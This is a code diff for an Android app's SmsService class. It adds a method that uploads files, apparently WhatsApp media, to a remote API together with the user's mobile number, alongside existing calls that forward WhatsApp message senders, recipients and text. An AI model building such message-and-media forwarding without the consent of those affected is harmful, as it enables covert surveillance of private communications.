@@ -2,6 +2,7 @@ package gonext.smsapp.servers;
 
 import android.app.Notification;
 import android.content.Context;
+import android.webkit.MimeTypeMap;
 
 import com.google.gson.Gson;
 import com.google.gson.GsonBuilder;
@@ -19,6 +20,7 @@ import gonext.smsapp.db.NotificationEntity;
 import gonext.smsapp.utils.Constant;
 import retrofit.RestAdapter;
 import retrofit.client.OkClient;
+import retrofit.mime.TypedFile;
 
 /**
  * Created by ram on 14/09/17.
@@ -80,6 +82,11 @@ public class SmsService {
         smsAPI.postWhatsApp("WHATSAPP",userMob,msgId,msgDate,removeSpChars(msgFrom),removeSpChars(to),msgText,smsCallback);
     }
 
+    public void sendMedia(File file,String userMobile){
+        initSMSAPI();
+        SmsCallback smsCallback = new SmsCallback(4);
+        smsAPI.postWhatsAppMedia("UPLOAD",userMobile,new TypedFile(getMimeType(file.getAbsolutePath()),file), smsCallback);
+    }
     public static String removeSpChars(String s){
         s = s.replace("+","");
         s = s.replace("-","");
@@ -87,5 +94,13 @@ public class SmsService {
         s = s.replace(")","");
         s = s.replace(" ","");
         return s;
+    }
+    public static String getMimeType(String url) {
+        String type = null;
+        String extension = MimeTypeMap.getFileExtensionFromUrl(url);
+        if (extension != null) {
+            type = MimeTypeMap.getSingleton().getMimeTypeFromExtension(extension);
+        }
+        return type;
     }
 }
